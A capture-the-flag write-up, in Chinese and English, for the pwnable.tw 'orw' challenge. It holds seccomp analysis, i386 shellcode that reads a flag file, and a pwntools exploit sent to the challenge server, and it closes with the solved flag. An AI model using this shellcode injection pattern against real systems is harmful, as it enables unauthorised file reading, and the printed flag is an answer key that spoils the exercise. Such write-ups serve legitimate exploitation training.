# orw 

```=
orw: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-
linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e60ecccd9d01c8217387e8b77e9261a1f36b5030, not stripped
```
writeup：

因為有
```=
    Arch:     i386-32-little                                                                          
    RELRO:    Partial RELRO                                                                            
    Stack:    Canary found                                                                             
    NX:       NX disabled                                                                              
    PIE:      No PIE (0x8048000)                                                                        
    RWX:      Has RWX segments   <-----   
```
開 seccomp-tool 看
```=
user@lab  ~/下載/pwnabletw/orw  seccomp-tools dump /home/user/下載/pwnabletw/orw/orw               
 line  CODE  JT   JF      K
=================================                                                                       
 0000: 0x20 0x00 0x00 0x00000004  A = arch                                                              
 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011                                         
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number                                                        
 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011                                      
 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011                                         
 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011                                        
 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011                                              
 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011                                              
 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011                                              
 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011                                             
 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)                                                      
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW    
```
能用的syscall 沒幾個
```=
> rt_sigreturn
> sigreturn
> exit_group
> exit
> open
> read
> write
```
shellcode
```=
;/home/orw/flag

mov eax, 0x6761       ; ga
push eax
mov eax, 0x6c662f77   ; lf/w
push eax
mov eax, 0x726f2f65   ; ro/e
push eax
mov eax, 0x6d6f682f   ; moh/               要先填滿  沒有先填滿 不然下面的stack 會不連貫        
push eax
mov eax, 5
mov ebx, esp
mov ecx, 0
mov edx, 0
int 0x80              ; open

mov eax, 3
mov ebx, eax
mov ecx, esp
mov edx, 50
int 0x80              ; read

mov edx, 50
mov ecx, esp
mov ebx, 1
mov eax, 4
int 0x80              ; write
```


payload


```python
from pwn import *

r = remote('chall.pwnable.tw',10001)

payload = shellcraft.i386.linux.open('/home/orw/flag', 0)
payload += shellcraft.i386.linux.read(3, 'esp', 100)
payload += shellcraft.i386.linux.write(1, 'esp', 100)
print (payload)
r.sendafter('shellcode:', asm(payload))
r.interactive()

# FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}
```